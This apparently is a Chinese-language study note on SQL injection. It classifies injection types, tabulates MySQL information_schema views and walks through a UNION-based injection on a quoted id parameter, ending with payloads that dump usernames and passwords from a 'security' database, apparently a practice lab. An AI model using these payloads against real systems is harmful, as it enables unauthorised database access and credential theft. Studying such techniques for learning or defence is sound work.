---
title: "sql注入学习"
date: 2024-05-18
description: ""
tags: ["sql注入"]
categories: ["${folder}"]
---

# SQL注入分类

依据注入点类型分类

 - 数字类型的注入

 - 字符串类型的注入

 - 搜索型注入

依据提交方式分类

 - GET注入

 - POST注入

 - COOKIE注入

 - HTTP头注入(XFF注入、UA注入、REFERER注入)

依据获取信息的方式分类

 - 基于布尔的盲注

 - 基于时间的盲注

 - 基于报错的注入

 - 联合查询注入

 - 堆查询注入 (可同时执行多条语句)

# information_schema库表对应关系

| 数据库 (View)                | 代表内容 | 数据库名字段         | 表名字段         | 列名字段          | 其他关键字段                                            |
| ------------------------ | ---- | -------------- | ------------ | ------------- | ------------------------------------------------- |
| `schemata`               | 数据库  | `schema_name`  | —            | —             | `default_character_set_name`, `sql_path`          |
| `tables`                 | 表    | `table_schema` | `table_name` | —             | `table_type`, `engine`, `create_time`             |
| `columns`                | 列/字段 | `table_schema` | `table_name` | `column_name` | `data_type`, `is_nullable`, `column_default`      |



# 注入步骤

>下面演示的是单引号字符型注入

1. 探测漏洞

```
?id=1'
?id=1"
?id=1-1
...
```

1. 用 `order by` 排序函数探测字段总数，用五分法可快速定位

```
?id=1' order by 6 #
```

1. 使用联合查询 `union` 函数结果探测回显位置，要保证 `union` 左边的语句不能查询到数据,右边的我们自己构造的语句才能获取数据

```
id=-1' union select 111,222,333,444,555,666 #
```

4. 用回显位查询当前数据库名和版本号

```
?id=-1' union select 111,database(),version(),user(),555,666 #
```

5. 查询数据库名
    
```
?id=-1' union select 111,group_concat(schema_name),333 from information_schema.schemata #
```

6. 查询security数据库里的表名

```
?id=-1' union select 111,group_concat(table_name),333 from information_schema.tables where table_schema ='security' #
```

7. 查询security数据库users数据表的字段名

```
?id=-1' union select 111,group_concat(column_name),333 from information_schema.columns where table_schema ='security' and table_name = 'users' #
```
>至此，查询三要素（库/表/字段）已集齐，可以删掉 `information_schema` 表，进行自由进行查询

8. 查询security数据库users数据表中的username,password字段的数据

```
?id=-1' union select 111,group_concat(username,password),333 from security.users #
```


# 函数注释

```
group_concat('要查询的值')  #让查询的所有数值集合并以逗号分隔显示
```

```
count(*)    #查询有多少条数据
```

```
order by    #排序数据
```

```
limit n,m   #从第n行开始，查询m行数据
```
